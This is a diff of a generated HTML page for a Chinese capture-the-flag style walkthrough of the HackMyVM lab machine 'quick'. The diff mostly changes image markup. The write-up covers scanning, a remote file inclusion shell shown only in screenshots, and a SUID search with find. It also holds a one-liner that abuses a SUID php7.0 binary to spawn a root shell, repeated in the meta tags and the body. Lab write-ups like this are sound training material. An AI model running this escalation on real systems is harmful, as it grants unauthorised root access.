@@ -11,8 +11,8 @@
 <meta name="referrer" content="no-referrer">
 <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1"/>
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
-<meta name="description" content="host discovery 主机发现, 重置了 wsl 的环境之后, 发现能够使用 arp-scan 了 前后对比 192.168.10.12 port scan 只有一个 80 端口 服务版本, 默认脚本, 操作系统扫描 漏洞扫描 利用远程包含获得 shell RFI user. txt PWD use SUID file to get root find / -type f -perm -u=s 2&gt;/dev/null 发现一个suid的 php
-./usr/bin/php7.0 -r &#34;pcntl_exec(&#39;/bin/sh&#39;, [&#39;-p&#39;]);&#34; root. txt PWD "/>
+<meta name="description" content="host discovery 主机发现, 重置了 wsl 的环境之后, 发现能够使用 arp-scan 了 HMM_quick_image_1 前后对比 HMM_quick_image_2 192.168.10.12 port scan 只有一个 80 端口 HMM_quick_image_3 服务版本, 默认脚本, 操作系统扫描 HMM_quick_image_4 漏洞扫描 HMM_quick_image_5 利用远程包含获得 shell RFI HMM_quick_image_6 HMM_quick_image_7 user. txt PWD HMM_quick_image_8 HMM_quick_image_9 use SUID file to get root find / -type f -perm -u=s 2&gt;/dev/null 发现一个suid的 php
+./usr/bin/php7.0 -r &#34;pcntl_exec(&#39;/bin/sh&#39;, [&#39;-p&#39;]);&#34; root. txt PWD HMM_quick_image_10 "/>
 <meta name="keywords" content=""/>
 
 <link href="/atom.xml" title="l1uyun" type="application/rss+xml">
@@ -32,8 +32,8 @@
 <meta property="og:url" content="https://l1uyun.one/posts/hmv_quick/">
   <meta property="og:site_name" content="l1uyun">
   <meta property="og:title" content="quick">
-  <meta property="og:description" content="host discovery 主机发现, 重置了 wsl 的环境之后, 发现能够使用 arp-scan 了 前后对比 192.168.10.12 port scan 只有一个 80 端口 服务版本, 默认脚本, 操作系统扫描 漏洞扫描 利用远程包含获得 shell RFI user. txt PWD use SUID file to get root find / -type f -perm -u=s 2&gt;/dev/null 发现一个suid的 php
-./usr/bin/php7.0 -r &#34;pcntl_exec(&#39;/bin/sh&#39;, [&#39;-p&#39;]);&#34; root. txt PWD">
+  <meta property="og:description" content="host discovery 主机发现, 重置了 wsl 的环境之后, 发现能够使用 arp-scan 了 HMM_quick_image_1 前后对比 HMM_quick_image_2 192.168.10.12 port scan 只有一个 80 端口 HMM_quick_image_3 服务版本, 默认脚本, 操作系统扫描 HMM_quick_image_4 漏洞扫描 HMM_quick_image_5 利用远程包含获得 shell RFI HMM_quick_image_6 HMM_quick_image_7 user. txt PWD HMM_quick_image_8 HMM_quick_image_9 use SUID file to get root find / -type f -perm -u=s 2&gt;/dev/null 发现一个suid的 php
+./usr/bin/php7.0 -r &#34;pcntl_exec(&#39;/bin/sh&#39;, [&#39;-p&#39;]);&#34; root. txt PWD HMM_quick_image_10">
   <meta property="og:locale" content="zh_CN">
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
@@ -239,30 +239,80 @@ function checkNightMode() {
 </nav>
       <h2 id="host-discovery">host discovery</h2>
 <p>主机发现, 重置了 wsl 的环境之后, 发现能够使用 arp-scan 了
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_quick_image_1.png" alt="HMM_quick_image_1"  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_quick_image_1.png" alt="HMM_quick_image_1" /><figcaption>HMM_quick_image_1</figcaption></figure>
+
+
+
 前后对比
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_quick_image_2.png" alt="HMM_quick_image_2"  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_quick_image_2.png" alt="HMM_quick_image_2" /><figcaption>HMM_quick_image_2</figcaption></figure>
+
+
+</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>192.168.10.12
 </span></span></code></pre></div><h2 id="port-scan">port scan</h2>
 <p>只有一个 80 端口
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_quick_image_3.png" alt="HMM_quick_image_3"  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_quick_image_3.png" alt="HMM_quick_image_3" /><figcaption>HMM_quick_image_3</figcaption></figure>
+
+
+</p>
 <p>服务版本, 默认脚本, 操作系统扫描
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_quick_image_4.png" alt="HMM_quick_image_4"  />
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_quick_image_4.png" alt="HMM_quick_image_4" /><figcaption>HMM_quick_image_4</figcaption></figure>
+
+
+
 漏洞扫描
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_quick_image_5.png" alt="HMM_quick_image_5"  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_quick_image_5.png" alt="HMM_quick_image_5" /><figcaption>HMM_quick_image_5</figcaption></figure>
+
+
+</p>
 <h2 id="利用远程包含获得-shell">利用远程包含获得 shell</h2>
 <p>RFI
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_quick_image_6.png" alt="HMM_quick_image_6"  />
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_quick_image_7.png" alt="HMM_quick_image_7"  /></p>
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_quick_image_6.png" alt="HMM_quick_image_6" /><figcaption>HMM_quick_image_6</figcaption></figure>
+
+
+
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_quick_image_7.png" alt="HMM_quick_image_7" /><figcaption>HMM_quick_image_7</figcaption></figure>
+
+
+</p>
 <h2 id="user-txt-pwd">user. txt PWD</h2>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_quick_image_8.png" alt="HMM_quick_image_8"  />
-<img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_quick_image_9.png" alt="HMM_quick_image_9"  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_quick_image_8.png" alt="HMM_quick_image_8" /><figcaption>HMM_quick_image_8</figcaption></figure>
+
+
+
+
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_quick_image_9.png" alt="HMM_quick_image_9" /><figcaption>HMM_quick_image_9</figcaption></figure>
+
+
+</p>
 <h2 id="use-suid-file-to-get-root">use SUID file to get root</h2>
 <p><code>find / -type f -perm -u=s 2&gt;/dev/null</code>
 发现一个suid的 php</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./usr/bin/php7.0 -r <span style="color:#e6db74">&#34;pcntl_exec(&#39;/bin/sh&#39;, [&#39;-p&#39;]);&#34;</span>
 </span></span></code></pre></div><h2 id="root-txt-pwd">root. txt PWD</h2>
-<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMM_quick_image_10.png" alt="HMM_quick_image_10"  /></p>
+<p>
+<figure class="md-figure">
+  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_quick_image_10.png" alt="HMM_quick_image_10" /><figcaption>HMM_quick_image_10</figcaption></figure>
+
+
+</p>
 
       
     </div>
@@ -417,7 +467,7 @@ function checkNightMode() {
 <footer class="footer">
   <div class="footer__inner">
     <div class="copyright copyright-font">
-      <span>共 85391 字 <br/> 还在努力更新中..</br>加油！加油啦！</span>
+      <span>共 85604 字 <br/> 还在努力更新中..</br>加油！加油啦！</span>
     </div>
       
     
